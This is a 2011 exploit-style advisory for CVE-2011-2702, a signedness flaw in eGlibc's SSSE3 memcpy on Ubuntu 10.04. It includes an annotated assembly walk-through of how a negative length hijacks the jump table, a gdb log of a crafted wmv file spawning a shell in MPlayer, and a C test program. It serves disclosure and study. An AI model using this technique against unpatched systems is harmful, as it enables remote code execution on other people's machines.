# Exploit Title: eGlibc Signedness Vulnerability
# Date: November 2011
# Exploit Author: c0ntex
# Vendor Homepage: http://www.eglibc.org
# Software Link: http://www.eglibc.org/home
# Version: eGlibc supplied by Ubuntu 10.4 LTS
# Tested on: Ubuntu 10.4 LTS
# CVE : CVE-2011-2702

A delicious, yet slightly cold banquette prepared on the (jump)table

On the 24th of February 2010 a patch was provided to the main Glibc tree which added optimisation support for 64 bit processors by adding unsigned conditional jumps to support > 2GB data sizes.

The following timelines were discovered:

Glibc source code:
Vulnerable ssse3 support added -> http://sourceware.org/git/?p=glibc.git;a=commit;h=3af48cbdfaeb8bc389de1caeb33bc29811da80e8
Vulnerable ssse3 support fixed -> http://sourceware.org/git/?p=glibc.git;a=commit;h=a0ac24d98ace90d1ccba6a2f3e7d55600f2fdb6e

eGlibc source code:
Vulnerable ssse3 support added -> http://www.eglibc.org/cgi-bin/viewcvs.cgi?rev=9649&view=rev
Vulnerable ssse3 support fixed -> http://www.eglibc.org/cgi-bin/viewcvs.cgi?rev=10032&view=rev


This patch introduced a signedness bug causing any program compiled against the vulnerable version of eglibc and using optimised functions such as memcpy_ssse3 and memcpy-ssse3-back to be potentially vulnerable to unexpected code execution.

If an attacker could control the length parameter supplied memcpy, it may be possible to cause the application to execute user controllable code. This has been verified and tested on a fully patched and up to date installation of Ubuntu 10.4 LTS against various applications.


When this is the case, an attacker controllable length value is used to calculate the jump table pointer index in the optimized copy function. Setting the length value to a negative number will cause a jmp instruction to be skipped due to an signedness vulnerbility, resulting in attacker supplied value being used to calculate the location of a jump table function, resulting in malicious code execution.

The following is the vulnerable assembly code used to trigger this bug:

Dump of assembler code for function __memcpy_ssse3:
   0x00562000 <+0>:     push   %ebx
   0x00562001 <+1>:     mov    0x10(%esp),%ecx
   0x00562005 <+5>:     mov    0xc(%esp),%eax
   0x00562009 <+9>:     mov    0x8(%esp),%edx

if the value in $ecx is a signed int above or equal to 0x30
   0x0056200d <+13>:    cmp    $0x30,%ecx

we will take the following jump and the fun ends however since I supply a value of 0xbfff20d4 (or something similar) it will be over 2 gig and as such, negative in value, jump is skipped
   0x00562010 <+16>:    jge    0x562040 <__memcpy_ssse3+64>

dl isn't less than al
   0x00562012 <+18>:    cmp    %dl,%al

so this is skipped
   0x00562014 <+20>:    jl     0x56202a <__memcpy_ssse3+42>
   0x00562016 <+22>:    add    %ecx,%edx
   0x00562018 <+24>:    add    %ecx,%eax
   0x0056201a <+26>:    call   0x468a0f <__i686.get_pc_thunk.bx>

the location to the jump table is stored in $ebx
   0x0056201f <+31>:    add    $0x2a591,%ebx

get the offset to the jump table entry, attacker controls ecx
   0x00562025 <+37>:    add    (%ebx,%ecx,4),%ebx

execute the instruction at $ebx, calculated using user supplied value ;)
   0x00562028 <+40>:    jmp    *%ebx

There are no hard coded addresses needed for exploitation to succeed, allowing for the defeat of ASLR protection. The following is the vulnerability during runtime showing the execution of a shell by playing a wmv file, and can also be replicated remotely.

(gdb) r ~/Desktop/expl.wmv
Starting program: /usr/bin/mplayer ~/Desktop/expl.wmv
[Thread debugging using libthread_db enabled]

MPlayer SVN-r1.0~rc3+svn20090426-4.4.3 (C) 2000-2009 MPlayer Team
mplayer: could not connect to socket
mplayer: No such file or directory
Failed to open LIRC support. You will not be able to use your remote control.

Playing /home/user/Desktop/expl.wmv.
ASF file format detected.
[asfheader] Audio stream found, -aid 97
process 17760 is executing new program: /bin/dash
$
Program exited normally.
(gdb) q

The following code can be used to verify if your system is vulnerable:

Example code that can be used to test for this vulnerability:
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{
        char * buf = NULL;
        puts("Usage: ./test A 3492348247\n");
        memcpy(buf, argv[1], atoi(argv[2]));
        return 0;
}

I tested this issue on the latest version of Fedora, Suse, Slackware, FreeBSD, Ubuntu 10.10 and 10.4 LTS. Ubuntu 10.10 is patched but Ubuntu 10.4, which is the long term support version that every production server and most personal desktops / laptops runs, is vulnerable.

Code provided by eglibc at the following location:
http://www.eglibc.org/cgi-bin/viewcvs.cgi/fsf/trunk/libc/sysdeps/i386/i686/multiarch/memcpy-ssse3.S?rev=9649&view=markup